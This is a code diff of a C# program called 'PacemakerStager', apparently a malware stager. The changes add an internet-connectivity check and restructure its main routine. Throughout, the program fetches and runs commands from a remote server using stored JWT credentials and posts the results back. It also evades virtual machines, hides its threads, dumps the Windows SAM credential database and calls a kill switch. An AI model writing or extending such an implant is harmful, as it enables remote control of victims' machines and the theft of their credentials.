@@ -10,6 +10,8 @@ using System.Threading.Tasks;
 using System.Runtime.InteropServices;
 using System.Collections.Generic;
 using System.Runtime.Serialization.Formatters.Binary;
+using System.Net;
+using System.Globalization;
 
 namespace PacemakerStager
 {
@@ -72,8 +74,9 @@ namespace PacemakerStager
 
         public async static Task<CmdResult> GetAndRunCmd()
         {
+         
             HttpClient Client = new HttpClient();
-
+           
             string jsonData = "{\"username\": \"" + authObj.Username + "\", \"jwt_key\": \"" + authObj.JwtToken + "\"}";
 
             var content = new StringContent(jsonData, Encoding.UTF8, "application/json");
@@ -127,6 +130,8 @@ namespace PacemakerStager
             }
 
             return resultObj;
+
+            
         }
 
 
@@ -224,15 +229,52 @@ namespace PacemakerStager
             return;
         }
 
+        public static async Task<bool> CheckForInternetConnection(int timeoutMs = 10000, string url = null)
+        {
+            try
+            {
+                url ??= CultureInfo.InstalledUICulture switch
+                {
+                    { Name: var n } when n.StartsWith("fa") => // Iran
+                        "http://www.aparat.com",
+                    { Name: var n } when n.StartsWith("zh") => // China
+                        "http://www.baidu.com",
+                    _ =>
+                        "http://www.gstatic.com/generate_204",
+                };
+
+                var request = (HttpWebRequest)WebRequest.Create(url);
+                request.KeepAlive = false;
+                request.Timeout = timeoutMs;
+                using (var response =  (HttpWebResponse)request.GetResponse())
+                    return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
         static async Task Main(string[] args)
         {
-
+            
             const int SW_HIDE = 0;
             const int SW_SHOW = 5;
             var handle = GetConsoleWindow();
 
             // Hide
-            ShowWindow(handle, SW_HIDE);
+            // ShowWindow(handle, SW_HIDE);
+
+            bool checkInternet = await CheckForInternetConnection(10000, "https://google.com");
+            int round = 1;
+
+            while (checkInternet == false)
+            {
+                Thread.Sleep(10000);
+                checkInternet = await CheckForInternetConnection(10000, "https://google.com");
+                Console.WriteLine("Checked for internet " + round + " time" + (round == 1 ? "" : "s") + "...");
+                round++;
+            }
 
             if (Scanner.IsRunningInVM() == true)
             {
@@ -249,67 +291,63 @@ namespace PacemakerStager
                 Console.WriteLine("Nope!");
                 return;
             }
+           
+            DbgPrt2.HideOSThreads();
 
+            if (File.Exists("authObject.dat"))
+            {
+                try
+                {
+                    BinaryFormatter MainBinaryFormatter5 = new BinaryFormatter();                           ///
+                    Stream stream2;                                                        /// 
+                    stream2 = File.Open("authObject.dat", FileMode.Open);
+                    authObj = (AuthCore)MainBinaryFormatter5.Deserialize(stream2);                         /// 
+                    stream2.Close();
+
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine(ex.Message);
+                    await InitialHandshake();
+                    Console.WriteLine("Finished authenticating...");
+                }
+
+            }
             else
             {
-                DbgPrt2.HideOSThreads();
+                file_stream = File.Create("authObject.dat");
+                file_stream.Close();
 
-                if (File.Exists("authObject.dat"))
-                {
-                    try
-                    {
-                        BinaryFormatter MainBinaryFormatter5 = new BinaryFormatter();                           ///
-                        Stream stream2;                                                        /// 
-                        stream2 = File.Open("authObject.dat", FileMode.Open);
-                        authObj = (AuthCore)MainBinaryFormatter5.Deserialize(stream2);                         /// 
-                        stream2.Close();
+                await InitialHandshake();
 
-                    }
-                    catch (Exception ex)
-                    {
-                        Console.WriteLine(ex.Message);
-                        await InitialHandshake();
-                        Console.WriteLine("Finished authenticating");
-                    }
-
-                }
-                else
-                {
-                    file_stream = File.Create("authObject.dat");
-                    file_stream.Close();
-
-                    await InitialHandshake();
-
-                    Console.WriteLine("Finished authenticating");
-                }
-
-
-                CmdResult resultObj = await GetAndRunCmd();
-
-                if (resultObj.result == null || resultObj.result.Length < 1)
-                {
-                    Console.WriteLine("Pass");
-                }
-                else
-                {
-                    bool postStatus = await PostEffectiveResults(resultObj);
-
-                    if (postStatus == false)
-                    {
-                        await KillSwitch();
-                    }
-                }
-
-                Thread.Sleep(3000);
-                Console.WriteLine("Got and Ran commands: ");
-                MrSam.SamDmp();
-                await KillSwitch();
-
-                Console.WriteLine("Done");
-                File.Delete("result.txt");
-
-                Console.Read();
+                Console.WriteLine("Finished authenticating...");
             }
+
+            CmdResult resultObj = await GetAndRunCmd();
+
+            if (resultObj.result == null || resultObj.result.Length < 1)
+            {
+                Console.WriteLine("[!] Pass...");
+            }
+            else
+            {
+                bool postStatus = await PostEffectiveResults(resultObj);
+
+                if (postStatus == false)
+                {
+                    await KillSwitch();
+                }
+            }
+
+            Thread.Sleep(3000);
+            Console.WriteLine("Got and Ran commands...");
+            MrSam.SamDmp();
+            await KillSwitch();
+
+            Console.WriteLine("Done...");
+            File.Delete("result.txt");
+
+            Console.Read();
         }
     }
 }
